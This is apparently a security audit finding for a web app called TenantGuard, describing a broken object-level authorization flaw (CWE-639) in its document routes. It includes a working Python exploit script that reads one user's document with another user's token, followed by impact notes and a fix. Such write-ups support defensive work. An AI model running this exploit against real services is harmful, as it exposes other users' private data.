# Vulnerability: Broken Object Level Authorization (BOLA)

## 1. Vulnerability Name
**CWE-639: Authorization Bypass Through User-Controlled Key**

## 2. Location in Code
- **File:** `backend/src/routes/documents.js` (lines 45-55)
- **File:** `backend/src/routes/payment.js` (lines 25-35)

```javascript
// documents.js - No ownership verification
router.get('/:id', authenticateToken, async (req, res) => {
    try {
        const document = await Document.findById(req.params.id);
        if (!document) {
            return res.status(404).json({ message: 'Document not found' });
        }
        res.json(document);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});
```

## 3. Technical Root Cause
The application fails to verify that the authenticated user has permission to access the requested resource. Object IDs are used directly from user input without checking ownership or authorization, allowing users to access documents and payments belonging to other users.

## 4. Proof of Concept Explanation
1. Login as User A and create a document, note the document ID
2. Login as User B with a different account
3. Use User B's token to request User A's document by ID
4. Successfully retrieve document that should be inaccessible

## 5. Exploit Script

```python
#!/usr/bin/env python3
import requests
import json

def exploit_bola():
    base_url = "http://localhost:5000"
    
    # Login as first user
    user1_login = {
        "email": "demo@tenantguard.com",
        "password": "demo123"
    }
    
    response1 = requests.post(f"{base_url}/api/auth/login", json=user1_login)
    user1_token = response1.json().get('token')
    
    # Login as second user
    user2_login = {
        "email": "test@tenantguard.com", 
        "password": "test123"
    }
    
    response2 = requests.post(f"{base_url}/api/auth/login", json=user2_login)
    user2_token = response2.json().get('token')
    
    # Get user1's documents
    headers1 = {"Authorization": f"Bearer {user1_token}"}
    docs_response = requests.get(f"{base_url}/api/documents", headers=headers1)
    
    if docs_response.status_code == 200:
        documents = docs_response.json()
        if documents:
            target_doc_id = documents[0]['_id']
            
            # Try to access user1's document with user2's token
            headers2 = {"Authorization": f"Bearer {user2_token}"}
            bola_response = requests.get(f"{base_url}/api/documents/{target_doc_id}", headers=headers2)
            
            if bola_response.status_code == 200:
                print("[!] BOLA VULNERABILITY CONFIRMED")
                print(f"[+] Accessed document {target_doc_id} across user boundaries")
                print(f"[+] Document data: {bola_response.json()}")
                return True
    
    return False

if __name__ == "__main__":
    exploit_bola()
```

## 6. Impact
- **Data Breach:** Access to sensitive documents across tenant boundaries
- **Privacy Violation:** Unauthorized access to personal and business information
- **Compliance Risk:** Violation of data protection regulations
- **Business Logic Bypass:** Circumvention of multi-tenant isolation

**CVSS Score:** 8.5 (High)

## 7. Fix Recommendation

Implement proper authorization checks:

```javascript
// documents.js - Add ownership verification
router.get('/:id', authenticateToken, async (req, res) => {
    try {
        const document = await Document.findOne({
            _id: req.params.id,
            userId: req.user.id,
            tenantId: req.user.tenantId
        });
        
        if (!document) {
            return res.status(404).json({ message: 'Document not found' });
        }
        
        res.json(document);
    } catch (error) {
        res.status(500).json({ message: 'Server error' });
    }
});

// Add middleware for authorization
const authorizeResource = (resourceModel) => {
    return async (req, res, next) => {
        try {
            const resource = await resourceModel.findOne({
                _id: req.params.id,
                userId: req.user.id,
                tenantId: req.user.tenantId
            });
            
            if (!resource) {
                return res.status(403).json({ message: 'Access denied' });
            }
            
            req.resource = resource;
            next();
        } catch (error) {
            res.status(500).json({ message: 'Authorization error' });
        }
    };
};
```